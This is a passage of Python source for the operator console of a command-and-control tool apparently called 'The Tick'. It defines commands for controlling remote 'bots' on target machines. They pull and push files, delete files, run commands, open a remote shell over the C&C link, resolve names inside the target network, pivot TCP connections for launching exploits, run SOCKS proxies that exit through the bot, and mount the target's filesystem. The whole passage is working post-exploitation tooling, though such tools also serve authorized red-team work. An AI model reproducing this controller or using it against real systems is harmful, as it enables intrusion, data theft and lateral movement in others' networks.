        self.current.file_pull(remote_file, local_file)
        print("Downloaded file: %s" % local_file)

    def do_push(self, line):
        """
    \x1b[32m\x1b[1mpush\x1b[0m <\x1b[34m\x1b[1mlocal file\x1b[0m>
    \x1b[32m\x1b[1mpush\x1b[0m <\x1b[34m\x1b[1mlocal file\x1b[0m> <\x1b[34m\x1b[1mremote file\x1b[0m>

    Push a file into the target machine.\n"""

        # A bot must be selected.
        if self.current is None:
            print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
            return

        # Parse the arguments, on error show help.
        try:
            args = split(line, comments=True)
            if len(args) == 1:
                local_file = args[0]
                remote_file = os.path.basename(local_file)
            else:
                local_file, remote_file = split(line, comments=True)
        except Exception:
            self.onecmd("help push")
            return

        # Perform the operation.
        self.current.file_push(local_file, remote_file)
        print("Uploaded file: %s" % remote_file)

    def do_chmod(self, line):
        """
    \x1b[32m\x1b[1mchmod\x1b[0m <\x1b[34m\x1b[1mmode flags\x1b[0m> <\x1b[34m\x1b[1mremote file\x1b[0m>

    Change a file's access mode flags. Mode flags are in octal.\n"""

        # A bot must be selected.
        if self.current is None:
            print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
            return

        # Parse the arguments, on error show help.
        try:
            mode_flags, remote_file = split(line, comments=True)
        except Exception:
            self.onecmd("help chmod")
            return

        # Perform the operation.
        self.current.file_chmod(remote_file, int(mode_flags, 8))

    def do_rm(self, line):
        """
    \x1b[32m\x1b[1mrm\x1b[0m <\x1b[34m\x1b[1mremote file\x1b[0m>

    Delete a file.\n"""

        # A bot must be selected.
        if self.current is None:
            print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
            return

        # Parse the arguments, on error show help.
        try:
            remote_file, = split(line, comments=True)
        except Exception:
            self.onecmd("help rm")
            return

        # Perform the operation.
        self.current.file_unlink(remote_file)

    def do_exec(self, line):
        """
    \x1b[32m\x1b[1mexec\x1b[0m <\x1b[34m\x1b[1mcommand line\x1b[0m>

    Execute a non interactive command.
    The output of the command may be truncated if it exceeds memory usage.
    This will be more noticeable on embedded platforms.\n"""

        # A bot must be selected.
        if self.current is None:
            print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
            return

        # Perform the operation.
        output = self.current.file_exec(line).decode("utf8")

        # If the output is exactly aligned to page size,
        # that means it was likely truncated. Not an exact
        # way to determine this, but it'll do.
        if len(output) >= 1023 and ((len(output) + 1) & 0x03ff) == 0:
            output += "\n" + Fore.RED + Style.BRIGHT + "<output truncated>" + Style.RESET_ALL

        # Print the output from the command to screen.
        if output.endswith("\n"):
            output = output[:-1]
        print(output)

    def do_fork(self, line):
        """
    \x1b[32m\x1b[1mfork\x1b[0m

    Fork the bot instance.
    This will create a new bot instance that will connect automatically.
    The new instance will have a new UUID.
    This command takes no arguments.\n"""

        # A bot must be selected.
        if self.current is None:
            print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
            return

        # Parse the arguments, on error show help.
        if split(line, comments=True):
            self.onecmd("help fork")
            return

        # Perform the operation.
        self.current.system_fork()

    def do_shell(self, line):
        """
    \x1b[32m\x1b[1mshell\x1b[0m

    Launch an interactive shell over the C&C connection.
    This command takes no arguments.\n"""

        # A bot must be selected.
        if self.current is None:
            print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
            return

        # Parse the arguments, on error show help.
        if split(line, comments=True):
            self.onecmd("help shell")
            return

        # Remember the UUID of the bot. We will need this later.
        uuid = self.current.uuid

        # Launch an interactive shell on top of the interpreter.
        # When the remote shell dies, return to the interpreter.
        # When Control+C is hit, return to the interpreter.
        sock = self.current.system_shell()
        sleep(0.1)      # wait for the reconnection
        print(Fore.YELLOW + "/-------------------------------------------------\\" + Style.RESET_ALL)
        print(Fore.YELLOW + "| Entering remote shell. Use " + Style.BRIGHT + "Control+C" + Style.NORMAL + " to return. |" + Style.RESET_ALL)
        print(Fore.YELLOW + "\\-------------------------------------------------/" + Style.RESET_ALL)
        shell = RemoteShell(sock)
        shell.run_parent()
        print("")

        # Try to re-select the same bot when exiting the shell.
        # We need to do this because the shell command reuses the C&C socket,
        # so the bot must reconnect in the background with a new socket.
        self.current = self.listener.bots.get(uuid, None)

    def do_dig(self, line):
        """
    \x1b[32m\x1b[1mdig\x1b[0m <\x1b[34m\x1b[1mdomain name\x1b[0m>

    Resolve a domain name at the bot.
    This is useful for resolving local domains at the target network.\n"""

        # A bot must be selected.
        if self.current is None:
            print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
            return

        # Parse the arguments, on error show help.
        try:
            domain, = split(line, comments=True)
            if not domain:
                self.onecmd("help proxy")
                return
        except Exception:
            self.onecmd("help dig")
            return

        # Perform the operation.
        answer = self.current.dns_resolve(domain)

        # Show the results.
        for addr in answer:
            print(addr)

    def do_pivot(self, line):
        """
    \x1b[32m\x1b[1mpivot\x1b[0m <\x1b[34m\x1b[1mlisten on port\x1b[0m> <\x1b[34m\x1b[1mconnect to IP address\x1b[0m> <\x1b[34m\x1b[1mconnect to port\x1b[0m>

    Create a one shot TCP tunnel. Useful for pivoting when launching exploits.
    This tunnel will only be available to localhost and the port is closed
    once a client has connected.\n"""

        # A bot must be selected.
        if self.current is None:
            print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
            return

        # Make sure the bot is still alive.
        # This is inaccurate and strictly speaking unneeded,
        # but it helps a bit since we're about to launch
        # multiple threads and all that stuff, and we may
        # want to skip it for obviously wrong scenarios.
        if not self.current.alive:
            self.onecmd("help proxy")
            return

        # Parse the arguments, on error show help.
        try:
            listen, address, port = split(line, comments=True)
        except Exception:
            self.onecmd("help pivot")
            return

        # Remember the UUID of the bot. We will need this later.
        uuid = self.current.uuid

        # Listen on the requested port and wait for a single connection.
        listen  = int(listen)
        port    = int(port)
        address = gethostbyname(address)
        listen_sock = socket()
        listen_sock.bind( ("127.0.0.1", listen) )
        listen_sock.listen(1)
        print("Connect to port %d now..." % listen)
        accept_sock = listen_sock.accept()[0]
        try:

            # We got our connection, so we can stop listening.
            listen_sock.shutdown(2)
            listen_sock.close()

            # Connect to the target IP and port using the bot as a pivot.
            # This reuses the current C&C socket so we won't be able to
            # issue any more commands over it again. The bot will reconnect
            # automatically in the background, however.
            connect_sock = self.current.tcp_pivot(address, port)
            try:
                try:

                    # Fire up the TCP bouncers, one for each direction.
                    # That way we get a realtime duplex channel.
                    # Reading and writing sequentially would be a mistake,
                    # since we cannot be sure of the order in which that
                    # will happen, and we could deadlock.
                    bouncer_1 = TCPForward(connect_sock, accept_sock)
                    bouncer_2 = TCPForward(accept_sock, connect_sock)
                    bouncer_1.start()
                    bouncer_2.start()

                    # Nobody uses this, but we need it somewhere so the
                    # garbage collector doesn't destroy our objects.
                    # TODO review if this is actually true...
                    self.current.bouncers = (bouncer_1, bouncer_2)

                finally:

                    # Try to re-select the same bot when exiting the shell.
                    # We need to do this because the pivot reuses the C&C socket,
                    # so the bot must reconnect in the background with a new socket.
                    sleep(0.1)
                    self.current = self.listener.bots.get(uuid, None)

            # Just cleanup and error handling below.
            except:
                try:
                    connect_sock.shutdown(2)
                except:
                    pass
                try:
                    connect_sock.close()
                except:
                    pass
                raise
        except:
            try:
                accept_sock.shutdown(2)
            except:
                pass
            try:
                accept_sock.close()
            except:
                pass
            raise

    def do_proxy(self, line):
        """
    \x1b[32m\x1b[1mproxy\x1b[0m [\x1b[33m\x1b[1mls\x1b[0m]
    \x1b[32m\x1b[1mproxy\x1b[0m [\x1b[33m\x1b[1madd\x1b[0m] <\x1b[34m\x1b[1mport\x1b[0m> [\x1b[34m\x1b[1mbind address\x1b[0m] [\x1b[34m\x1b[1musername\x1b[0m] [\x1b[34m\x1b[1mpassword\x1b[0m]
    \x1b[32m\x1b[1mproxy\x1b[0m \x1b[33m\x1b[1mrm\x1b[0m <\x1b[34m\x1b[1mport\x1b[0m>

    Opens a SOCKS proxy on the given local port.
    Proxied connections will come out from the bot.

    Subcommands are:
        \x1b[33m\x1b[1mls\x1b[0m      Lists the currently active proxies
        \x1b[33m\x1b[1madd\x1b[0m     Adds a new proxy
        \x1b[33m\x1b[1mrm\x1b[0m      Removes an active proxy

    Arguments are:
        \x1b[33m\x1b[1mbind address\x1b[0m  Address to bind to (default: \x1b[34m\x1b[1m127.0.0.1\x1b[0m)
        \x1b[33m\x1b[1mport\x1b[0m          Port to listen on, also identifies the proxy
        \x1b[33m\x1b[1musername\x1b[0m      Optional username (if set, password must set too)
        \x1b[33m\x1b[1mpassword\x1b[0m      Optional password\n"""

        # This command has a tricky syntax with various subcommands.
        # They are listed below, along with helpful aliases.
        valid_commands = {
            "a": "add",
            "r": "rm",
            "l": "ls",
        }

        # Parse the command arguments.
        try:
            args = list(split(line, comments=True))

            # Trivial case (no arguments at all).
            # This is the same as the "ls" subcommand.
            if not args:
                command = "ls"
                port = None
            else:

                # Next easy case: no subcommand, just a port number.
                # That is shorthand for the "add" subcommand.
                # To make the logic easier we will just insert it.
                try:
                    int(args[0])
                    args.insert(0, "add")
                except ValueError:
                    pass

                # Get the subcommand.
                # If an alias has been used, convert it to the full name.
                command = args.pop(0)
                command = valid_commands.get(command, command)
                if command not in list(valid_commands.values()):
                    self.onecmd("help proxy")
                    return

                # Parse the "add" subcommand arguments.
                if command == "add":
                    port = int(args.pop(0))
                    if not 0 < port < 65536:
                        self.onecmd("help proxy")
                        return
                    if args:
                        bind_addr = args.pop(0)
                        bind_addr = inet_ntoa(inet_aton(bind_addr))
                        if args:
                            username = args.pop(0)
                            password = args.pop(0)  # must be used together
                            if args:
                                self.onecmd("help proxy")
                                return
                        else:
                            username = ""
                            password = ""
                    else:
                        bind_addr = "127.0.0.1"
                        username = ""
                        password = ""

                # Parse the "rm" subcommand arguments.
                elif command == "rm":
                    port = int(args.pop(0))
                    if not 0 < port < 65536 or args:
                        self.onecmd("help proxy")
                        return

                # Parse the "ls" subcommand arguments.
                elif command == "ls":
                    if args:
                        self.onecmd("help proxy")
                        return

                # Should never reach here.
                else:
                    raise Exception("internal error")

        # On error show a help message.
        except Exception:
            #print_exc()     # XXX DEBUG
            self.onecmd("help proxy")
            return

        # Execute the "add" subcommand.
        if command == "add":

            # A bot must be selected.
            if self.current is None:
                print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
                return

            # The bot must not be busy.
            if self.is_bot_busy():
                print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
                return

            # The port must be free.
            if port in self.proxies:
                print(Fore.YELLOW + "Error: port is already in use" + Style.RESET_ALL)
                return

            # Automatically fork the bot so we can keep using it.
            uuid = self.current.system_fork()

            # Create the SOCKSProxy.
            proxy = SOCKSProxy(self.listener, self.current.uuid, bind_addr, port, username, password)

            # Add it to the dictionary.
            self.proxies[port] = proxy

            # Launch the proxy.
            proxy.start()

            # With any luck the fork of the bot has already connected.
            # Try selecting it if we can. If we can't at least deselect it.
            sleep(0.1)
            self.current = self.listener.bots.get(uuid, None)

        # Execute the "rm" subcommand.
        elif command == "rm":

            # If there is no proxy at that port, complain.
            if port not in self.proxies:
                print(Fore.YELLOW + ("No proxy on port %d" % port) + Style.RESET_ALL)
                return

            # Remove the proxy from the dictionary and kill it.
            self.proxies.pop(port).kill()

        # Execute the "ls" subcommand.
        elif command == "ls":

            # If we had no active proxies, just show an error message.
            if not self.proxies:
                print(Fore.YELLOW + "No active proxies right now" + Style.RESET_ALL)
                print("(Use 'help proxy' to show the help)")
                return

            # We will show the list of proxies in an ASCII art table.
            # Same logic as the list of bots.
            table = Texttable()
            table.set_deco(Texttable.HEADER)
            table.set_cols_dtype(("i", "t", "t", "t", "t", "t"))
            table.set_cols_align(("l", "c", "c", "c", "c", "c"))
            table.set_cols_valign(("t", "t", "t", "t", "t", "t"))
            table.set_cols_width((len(str(len(self.proxies))), 36, 15+2, 5+2, 15+1, 4+2))
            table.add_rows((("#", "UUID", "Outgoing IP", "Port", "Bind IP", "Auth"),), header = True)
            i = 0
            for port, proxy in self.proxies.items():
                i += 1
                uuid = proxy.uuid
                bot = self.listener.bots[uuid]
                index = list(self.listener.bots.keys()).index(uuid)
                table.add_row((
                    index,
                    uuid,
                    "\x02" + bot.from_addr[0] + "\x04",
                    ("\x03" if proxy.alive else "\x01") + str(port) + "\x04",
                    "\x04" + proxy.bind_addr,
                    ("\x03yes\x04" if proxy.username and proxy.password else "\x01no\x04"),
                ))
            text = table.draw()
            text = text.replace("\x01", " " + Fore.RED + Style.BRIGHT)
            text = text.replace("\x02", " " + Fore.BLUE + Style.BRIGHT)
            text = text.replace("\x03", " " + Fore.GREEN + Style.BRIGHT)
            text = text.replace("\x04", Style.RESET_ALL + " ")
            print("")
            print(text)
            print("")

        # Should never reach here.
        else:
            raise Exception("internal error")

    # Mount and umount commands are only defined if we have FUSE installed.
    if HAVE_FUSE:

        def do_mount(self, line):
            """
        \x1b[32m\x1b[1mmount\x1b[0m
        \x1b[32m\x1b[1mmount\x1b[0m <\x1b[34m\x1b[1mmount point\x1b[0m>
        \x1b[32m\x1b[1mmount\x1b[0m <\x1b[34m\x1b[1mmount point\x1b[0m> [\x1b[34m\x1b[1moptions...\x1b[0m]

        Mounts the target machine's filesystem into a local directory.
        Any access to that directory will be transparently forwarded to the bot.
        When invoked with no arguments, list the existing mounted points.\n"""

            # Parse the command arguments.
            try:
                args = list(split(line, comments=True))
                mountpoint = None
                if args:
                    mountpoint = args[0]

            # On error show a help message.
            except Exception:
                #print_exc()     # XXX DEBUG
                self.onecmd("help mount")
                return

            # If no mount point was given, list the existing ones.
            if mountpoint is None:

                # If we had no active mount points, just show an error message.
                if not self.filesystems:
                    print(Fore.YELLOW + "No mounted filesystems right now" + Style.RESET_ALL)
                    print("(Use 'help mount' to show the help)")
                    return

                # We will show the list of mounted filesystems in an ASCII art table.
                # Same logic as the list of bots.
                mp_len = 25
                for mp in self.filesystems.keys():
                    if len(mp) > mp_len:
                        mp_len = len(mp)
                mp_len += 2
                table = Texttable()
                table.set_deco(Texttable.HEADER)
                table.set_cols_dtype(("i", "t", "t", "t"))
                table.set_cols_align(("l", "c", "c", "c"))
                table.set_cols_valign(("t", "t", "t", "t"))
                table.set_cols_width((len(str(len(self.filesystems))), 36, 15+2, mp_len))
                table.add_rows((("#", "UUID", "IP Address", "Mount Point"),), header = True)
                i = 0
                for mountpoint, fusethread in self.filesystems.items():
                    i += 1
                    uuid = fusethread.uuid
                    bot = self.listener.bots[uuid]
                    index = list(self.listener.bots.keys()).index(uuid)
                    table.add_row((
                        index,
                        uuid,
                        "\x02" + bot.from_addr[0] + "\x04",
                        "\x02" + mountpoint + "\x04",
                    ))
                text = table.draw()
                text = text.replace("\x01", " " + Fore.RED + Style.BRIGHT)
                text = text.replace("\x02", " " + Fore.BLUE + Style.BRIGHT)
                text = text.replace("\x03", " " + Fore.GREEN + Style.BRIGHT)
                text = text.replace("\x04", Style.RESET_ALL + " ")
                print("")
                print(text)
                print("")

            # If a mount point was given, mount the remote filesystem there.
            else:

                # Convert the mount point to an absolute path.
                mountpoint = os.path.abspath(mountpoint)

                # Check if the mount point is valid.
                if not os.path.isdir(mountpoint):
                    print(Fore.YELLOW + "Invalid mount point: " + repr(mountpoint) + Style.RESET_ALL)
                    return

                # A bot must be selected.
                if self.current is None:
                    print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
                    return

                # The bot must not be busy.
                if self.is_bot_busy():
                    print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
                    return

                # Automatically fork the bot so we can keep using it.
                uuid = self.current.system_fork()

                # Instance the FUSE thread object.
                fusethread = FUSEThread(self.listener, self.current.uuid, mountpoint, args[1:])

                # Add it to the dictionary.
                self.filesystems[mountpoint] = fusethread

                # Launch the thread.
                fusethread.start()

                # With any luck the fork of the bot has already connected.
                # Try selecting it if we can. If we can't at least deselect it.
                sleep(0.1)
                self.current = self.listener.bots.get(uuid, None)

        def do_umount(self, line):
            """
        \x1b[32m\x1b[1mumount\x1b[0m <\x1b[34m\x1b[1mmount point\x1b[0m>

        Unmounts a filesystem mounted with the "mount" command.\n"""

            # Parse the command arguments.
            try:
                args = list(split(line, comments=True))
                if len(args) != 1:
                    self.onecmd("help umount")
                    return

                mountpoint = args[0]

            # On error show a help message.
            except Exception:
                #print_exc()     # XXX DEBUG
                self.onecmd("help umount")
                return

            # Convert the mount point to an absolute path.
            mountpoint = os.path.abspath(mountpoint)

            # Check if the mount point is ours.
            if mountpoint not in self.filesystems:
                print(Fore.RED + "Unknown mount point: " + repr(mountpoint) + Style.RESET_ALL)
                return

            # Unmount the filesystem.
            try:
                check_call(["umount", mountpoint])
                #print("Removed filesystem at: " + mountpoint)
            except CalledProcessError:
                #print(Fore.RED + "Error removing filesystem at: " + mountpoint + Style.RESET_ALL)
                pass

            # Remove the filesystem from the list, regardless of whether it worked or not.
            # Otherwise we would end up with an ever growing list of errored out FUSE processes.
            del self.filesystems[mountpoint]

    def do_kill(self, line):
        """
    \x1b[32m\x1b[1mkill\x1b[0m

    Kill the currently selected bot.
    This command takes no arguments.\n"""

        # A bot must be selected.
        if self.current is None:
            print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
            return

        # Parse the arguments, on error show help.
        if split(line, comments=True):
            self.onecmd("help kill")
            return

        # Kill the currently selected bot.
        # If the bot refuses to die (they can do that, yes)
        # an exception will be raised at this point.
        self.current.system_exit()

        # Deselect the bot, since we know it's dead now.
        self.current = None

    # Spawns a Python shell with some handy local variables.
    # This is probably only useful for debugging.
    def do_dbg(self, arg):
        """
    \x1b[32m\x1b[1mdbg\x1b[0m

        Spawn a python interpreter with access to all of the console's internal
        variables. Note that the console will be frozen while this runs.
        """
        banner = ('Python %s on The Tick %s\nType "help", "copyright", '
                 '"credits" or "license" for more information.')
        platform = sys.version
        if " " in platform:
            platform = platform[:platform.find(" ")]
        banner = banner % (platform, TICK_VERSION)
        local = {
            '__name__'  : '__console__',
            'exit'      : self._python_exit,
            'self'      : self,
            'arg'       : arg,
        }
        local.update(globals())
        try:
            code.interact(banner=banner, local=local)
        except SystemExit:
            # We need to catch it so it doesn't kill our program.
            pass

    # This hack fixes a bug in Python, the interpreter console is closing the
    # stdin pipe when calling the exit() function (Ctrl+D/Ctrl+Z seems to work fine).
    class _PythonExit:
        def __repr__(self):
            if os.path.sep == '/':
                return "Use exit() or Ctrl-D (i.e. EOF) to exit"
            return "Use exit() or Ctrl-Z plus Return to exit"
        def __call__(self):
            raise SystemExit()
    _python_exit = _PythonExit()

##############################################################################
# The bit that launches the console itself.

# Main function. Assumes colorama has been initialized elsewhere.
def main(args = None):

    # If no arguments are given, use the system ones.
    if args is None:
        args = sys.argv[1:]

    # Load the interactive console.
    with Console(args) as c:

        # Show the intro banner.
        print(c.banner)

        # We need to put this in a loop because the base class
        # provided by Python is a bit silly and just dies whenever a
        # command raises an exception, we obviously don't want that.
        while True:
            try:

                # Run the command loop.
                c.cmdloop()

                # If we got here that means the exit command was used.
                break

            # Show bot errors in a pretty way.
            except BotError as e:
                print(Fore.RED + Style.BRIGHT + str(e) + Style.RESET_ALL)

            # Quit silently with Control+C.
            except KeyboardInterrupt:
                print("")
                break

            # Show all other exceptions as Python tracebacks.
            # Ugly, but easier to debug. You'll thank me.
            except Exception:
                print_exc()

if __name__ == "__main__":
    main()      # colorama already initialized when imported
    deinit()    # cleanup colorama
